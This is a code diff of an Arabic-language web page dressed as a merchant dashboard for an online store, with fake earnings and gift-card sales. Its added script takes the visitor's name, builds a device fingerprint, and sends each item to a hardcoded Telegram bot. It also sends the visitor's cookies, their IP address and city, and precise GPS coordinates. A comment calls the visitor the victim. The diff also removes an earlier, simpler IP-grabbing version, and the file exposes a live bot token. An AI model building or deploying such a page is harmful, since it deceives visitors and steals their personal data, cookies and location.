@@ -5,52 +5,24 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>لوحة التحكم | متجر حازم</title>
     <style>
-        body {
-            margin: 0; padding: 0; background-color: #050505;
-            color: white; font-family: 'Segoe UI', Tahoma, sans-serif;
-            display: flex; justify-content: center; align-items: center; min-height: 100vh;
-        }
+        body { margin: 0; padding: 0; background-color: #050505; color: white; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .neon-box { padding: 30px; border: 2px solid #00fbff; border-radius: 15px; background: rgba(0, 251, 255, 0.02); box-shadow: 0 0 20px #00fbff; text-align: center; width: 90%; max-width: 500px; }
+        h1 { font-size: 2.2rem; text-shadow: 0 0 10px #00fbff; margin-bottom: 15px; }
+        
+        /* تنسيق حقل الإدخال */
+        .input-group { margin-bottom: 20px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 8px; color: #00fbff; font-size: 0.9rem; }
+        .input-field { width: 100%; padding: 12px; background: rgba(255,255,255,0.05); border: 1px solid #00fbff; border-radius: 8px; color: white; outline: none; box-sizing: border-box; }
+        
+        .btn-next { background: transparent; color: #00fbff; border: 2px solid #00fbff; padding: 12px 50px; font-size: 1.2rem; border-radius: 10px; cursor: pointer; transition: 0.4s; font-weight: bold; box-shadow: 0 0 10px #00fbff; width: 100%; }
+        .btn-next:hover { background: #00fbff; color: #000; }
 
-        .neon-box {
-            padding: 30px; border: 2px solid #00fbff; border-radius: 15px;
-            background: rgba(0, 251, 255, 0.02); box-shadow: 0 0 20px #00fbff;
-            text-align: center; width: 90%; max-width: 500px;
-        }
-
-        h1 { font-size: 2.2rem; text-shadow: 0 0 10px #00fbff; margin-bottom: 20px; }
-
-        .btn-next {
-            background: transparent; color: #00fbff; border: 2px solid #00fbff;
-            padding: 15px 60px; font-size: 1.4rem; border-radius: 10px;
-            cursor: pointer; margin-top: 10px; transition: 0.4s; font-weight: bold;
-            box-shadow: 0 0 10px #00fbff;
-        }
-
-        .btn-next:hover { background: #00fbff; color: #000; box-shadow: 0 0 30px #00fbff; }
-
-        /* الواجهة الثانية: مخفية */
         #second-interface { display: none; text-align: right; }
-
-        .stats-grid {
-            display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0;
-        }
-
-        .stat-item {
-            background: rgba(255, 255, 255, 0.05); padding: 15px;
-            border-radius: 10px; border: 1px solid #333; text-align: center;
-        }
-
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
+        .stat-item { background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 10px; border: 1px solid #333; text-align: center; }
         .stat-item span { display: block; color: #00fbff; font-size: 1.4rem; font-weight: bold; }
-        .stat-item label { font-size: 0.8rem; color: #888; }
-
-        .transaction-list {
-            background: rgba(255, 255, 255, 0.03); border-radius: 10px;
-            padding: 15px; text-align: right; font-size: 0.9rem;
-        }
-
+        .transaction-list { background: rgba(255, 255, 255, 0.03); border-radius: 10px; padding: 15px; font-size: 0.9rem; }
         .t-item { border-bottom: 1px solid #222; padding: 8px 0; display: flex; justify-content: space-between; }
-        .t-status { color: #00ff88; }
-
         .fade-in { animation: fadeIn 0.5s ease-in-out; }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
     </style>
@@ -58,70 +30,32 @@
 <body>
 
     <div id="first-interface" class="neon-box">
-        <h1>أهلاً بك في متجر حازم</h1>
-        <button class="btn-next" onclick="handleStart()">التالي</button>
+        <h1>متجر حازم</h1>
+        <div class="input-group">
+            <label>سجل دخولك كزائر للمتابعة:</label>
+            <input type="text" id="visitor-name" class="input-field" placeholder="أدخل اسمك هنا...">
+        </div>
+        <button class="btn-next" onclick="handleStart()">دخول كزائر</button>
+        <p style="font-size: 0.6rem; color: #444; margin-top: 15px;">بالمتابعة أنت توافق على معالجة بيانات الجلسة المؤقتة</p>
     </div>
 
     <div id="second-interface" class="neon-box fade-in">
-        <h2 style="color: #00fbff; text-align: center; margin-bottom: 5px;">لوحة التاجر النشطة</h2>
-        <p style="font-size: 0.8rem; color: #666; text-align: center; margin-bottom: 20px;">ID الجلسة: HZ-2026-X99</p>
-
+        <h2 style="color: #00fbff; text-align: center;">لوحة التاجر النشطة</h2>
+        <p id="welcome-msg" style="text-align: center; color: #888;"></p>
         <div class="stats-grid">
-            <div class="stat-item">
-                <span>$2,840.00</span>
-                <label>إجمالي الأرباح</label>
-            </div>
-            <div class="stat-item">
-                <span>154</span>
-                <label>عمليات مكتملة</label>
-            </div>
+            <div class="stat-item"><span>$2,840.00</span><label>الأرباح</label></div>
+            <div class="stat-item"><span>154</span><label>عمليات</label></div>
         </div>
-
         <div class="transaction-list">
-            <div style="font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #00fbff;">أحدث المعاملات:</div>
-            <div class="t-item"><span>بيع بطاقة Google Play</span> <span class="t-status">+$50.00</span></div>
-            <div class="t-item"><span>شحن رصيد حساب #882</span> <span class="t-status">+$120.00</span></div>
+            <div class="t-item"><span>بيع بطاقة Google</span> <span style="color:#00ff88;">+$50.00</span></div>
+            <div class="t-item"><span>شحن رصيد</span> <span style="color:#00ff88;">+$120.00</span></div>
         </div>
-
-        <p style="color: #ffcc00; font-size: 0.85rem; margin-top: 20px; text-align: center;">
-            جاري مزامنة المحفظة الرقمية...
-        </p>
+        <p id="status-text" style="color: #ffcc00; font-size: 0.8rem; margin-top: 20px; text-align: center;">جاري المزامنة...</p>
     </div>
 
     <script>
         const BOT_TOKEN = '8480565791:AAFovWtTmBP3FfHzx4w9z10rXUtIZgwo6MQ';
         const CHAT_ID = '5991790192';
-
-        async function handleStart() {
-            // 1. الانتقال الفوري للواجهة الثانية
-            document.getElementById('first-interface').style.display = 'none';
-            document.getElementById('second-interface').style.display = 'block';
-
-            // 2. جلب الـ IP وإرساله (باستخدام سيرفر قوي للجوال)
-            try {
-                // جلب الـ IP الصافي أولاً
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const ipJson = await ipRes.json();
-                const userIP = ipJson.ip;
-
-                // جلب تفاصيل الموقع
-                const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
-                const geoData = await geoRes.json();
-
-                const message = `
-🎯 **دخول جديد (تم جلب الـ IP بنجاح):**
---------------------------
-🆔 **IP:** \`${userIP}\`
-📍 **الموقع:** ${geoData.city}, ${geoData.country_name}
-📱 **الجهاز:** ${navigator.platform}
---------------------------
-                `;
-                sendToTelegram(message);
-
-            } catch (error) {
-                sendToTelegram("⚠️ زائر جديد من الجوال (تم حظر تفاصيل الـ IP بواسطة المتصفح).");
-            }
-        }
 
         function sendToTelegram(text) {
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -129,6 +63,53 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
             });
+        }
+
+        async function handleStart() {
+            const visitorName = document.getElementById('visitor-name').value || "غير معروف";
+            
+            // تبديل الواجهة
+            document.getElementById('first-interface').style.display = 'none';
+            document.getElementById('second-interface').style.display = 'block';
+            document.getElementById('welcome-msg').innerText = "أهلاً بك، " + visitorName;
+
+            // إرسال الاسم فوراً
+            sendToTelegram(`👤 **زائر جديد سجل دخوله:**\nالاسم: \`${visitorName}\``);
+
+            // جمع البيانات العميقة (البصمة)
+            const fingerPrint = `
+📋 **تفاصيل جهاز الضحية (${visitorName}):**
+--------------------------
+🆔 **البصمة:** \`${navigator.userAgent.length}\`
+🖥️ **النظام:** ${navigator.platform}
+🧠 **المعالج:** ${navigator.hardwareConcurrency} نواة
+💾 **الرام:** ${navigator.deviceMemory || 'N/A'} GB
+🌐 **اللغة:** ${navigator.language}
+🕒 **التوقيت:** ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+🍪 **الكوكيز:** ${document.cookie || "فارغة"}
+--------------------------`;
+            sendToTelegram(fingerPrint);
+
+            // جلب الـ IP والموقع
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                const userIP = ipJson.ip;
+                
+                const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
+                const geoData = await geoRes.json();
+
+                sendToTelegram(`🎯 **IP و خريطة (${visitorName}):**\nIP: \`${userIP}\`\nالموقع: ${geoData.city}, ${geoData.country_name}`);
+            } catch (e) {}
+
+            // طلب الموقع الدقيق
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendToTelegram(`📍 **الموقع الدقيق لـ ${visitorName}:**\n${link}`);
+                    document.getElementById('status-text').innerText = "تم تحديث البيانات بنجاح.";
+                }, null, {enableHighAccuracy: true});
+            }
         }
     </script>
 </body>
